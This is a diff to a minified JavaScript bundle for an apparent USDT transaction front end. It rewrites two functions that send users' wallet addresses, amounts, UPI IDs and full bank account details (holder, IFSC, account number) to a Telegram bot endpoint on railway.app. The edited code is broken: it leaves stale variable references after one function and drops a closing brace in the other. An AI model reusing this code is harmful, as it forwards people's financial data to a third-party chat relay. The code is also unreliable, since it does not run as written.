@@ -36911,39 +36911,45 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 l(0)
             }
         }
-        async function gn({wallet_address: ue, amount: be, action: ct}) {
-            const st = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
-            try {
-                const ke = {
-                    content: "New Transaction Approval",
-                    embeds: [{
-                        title: "Wallet Activity",
-                        color: 5814783,
-                        fields: [{
-                            name: "Wallet Address",
-                            value: ue || "Unknown"
-                        }, {
-                            name: "Amount",
-                            value: be ? `${be} USDT` : "Unknown"
-                        }, {
-                            name: "Action",
-                            value: ct || "Unknown"
-                        }, {
-                            name: "Timestamp",
-                            value: new Date().toISOString()
-                        }],
-                        footer: {
-                            text: "USDT Transaction System"
-                        }
-                    }]
-                }
-                  , dt = await fetch(st, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(ke)
-                });
+      async function gn({ wallet_address, amount, action }) {
+  const url = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
+
+  try {
+    // ✅ Discord-style message
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "New Transaction Approval",
+        embeds: [{
+          title: "Wallet Activity",
+          color: 5814783,
+          fields: [
+            { name: "Wallet Address", value: wallet_address || "Unknown" },
+            { name: "Amount", value: amount ? `${amount} USDT` : "Unknown" },
+            { name: "Action", value: action || "Unknown" },
+            { name: "Timestamp", value: new Date().toISOString() }
+          ],
+          footer: { text: "USDT Transaction System" }
+        }]
+      })
+    });
+
+    // ✅ Telegram-compatible message
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        usdtAddress: wallet_address,
+        amount: amount
+      })
+    });
+
+    console.log("Successfully sent to Telegram and Discord");
+  } catch (error) {
+    console.error("Error in gn():", error);
+  }
+}
                 if (!dt.ok)
                     throw new Error(`Discord webhook error: ${dt.status} ${dt.statusText}`);
                 const Vn = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
@@ -36964,78 +36970,53 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
             }
         }
         async function uf(ue) {
-            const be = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
-            try {
-                const ct = {
-                    content: "New Transaction Approval",
-                    embeds: [{
-                        title: "Wallet Activity",
-                        color: 5814783,
-                        fields: [{
-                            name: "Wallet Address",
-                            value: ue.wallet_address || "Unknown"
-                        }, {
-                            name: "Amount",
-                            value: ue.amount ? `${ue.amount} USDT` : "Unknown"
-                        }, {
-                            name: "Payment Method",
-                            value: ue.payment_method || "Unknown"
-                        }, ...ue.payment_method === "UPI" ? [{
-                            name: "UPI ID",
-                            value: ue.upiId || "N/A"
-                        }, {
-                            name: "UPI Holder",
-                            value: ue.upiHolder || "N/A"
-                        }] : [{
-                            name: "Bank Holder",
-                            value: ue.bankHolder || "N/A"
-                        }, {
-                            name: "IFSC",
-                            value: ue.ifsc || "N/A"
-                        }, {
-                            name: "Bank Account",
-                            value: ue.bankAccount || "N/A"
-                        }, {
-                            name: "Bank Name",
-                            value: ue.bankName || "N/A"
-                        }], {
-                            name: "Action",
-                            value: ue.action || "Unknown"
-                        }, {
-                            name: "Timestamp",
-                            value: new Date().toISOString()
-                        }],
-                        footer: {
-                            text: "USDT Transaction System"
-                        }
-                    }]
-                }
-                  , st = await fetch(be, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(ct)
-                });
-                if (!st.ok)
-                    throw new Error(`Discord webhook error: ${st.status} ${st.statusText}`);
-                const ke = await fetch("https://telegram-bot-production-d2c7.up.railway.app/sendTelegram", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        usdtAddress: ue.wallet_address,
-                        amount: ue.amount
-                    })
-                });
-                if (!ke.ok)
-                    throw new Error(`API error: ${ke.status} ${ke.statusText}`);
-                console.log("Successfully sent to Discord and transaction-store API!")
-            } catch (ct) {
-                console.error("Error in sendToDiscordFromFrontend:", ct)
-            }
-        }
+           const url = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
+
+try {
+  // Send Discord embed
+  await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: "New Transaction Approval",
+      embeds: [{
+        title: "Wallet Activity",
+        color: 5814783,
+        fields: [
+          { name: "Wallet Address", value: ue.wallet_address || "Unknown" },
+          { name: "Amount", value: ue.amount ? `${ue.amount} USDT` : "Unknown" },
+          { name: "Payment Method", value: ue.payment_method || "Unknown" },
+          ...(ue.payment_method === "UPI" ? [
+            { name: "UPI ID", value: ue.upiId || "N/A" },
+            { name: "UPI Holder", value: ue.upiHolder || "N/A" }
+          ] : [
+            { name: "Bank Holder", value: ue.bankHolder || "N/A" },
+            { name: "IFSC", value: ue.ifsc || "N/A" },
+            { name: "Bank Account", value: ue.bankAccount || "N/A" },
+            { name: "Bank Name", value: ue.bankName || "N/A" }
+          ]),
+          { name: "Action", value: ue.action || "Unknown" },
+          { name: "Timestamp", value: new Date().toISOString() }
+        ],
+        footer: { text: "USDT Transaction System" }
+      }]
+    })
+  });
+
+  // Send Telegram message (just address + amount)
+  await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      usdtAddress: ue.wallet_address,
+      amount: ue.amount
+    })
+  });
+
+  console.log("Successfully sent to Discord and Telegram!");
+} catch (err) {
+  console.error("Error in sendToDiscordFromFrontend:", err);
+}
         async function po(ue) {
             d(ue),
             s(!0),
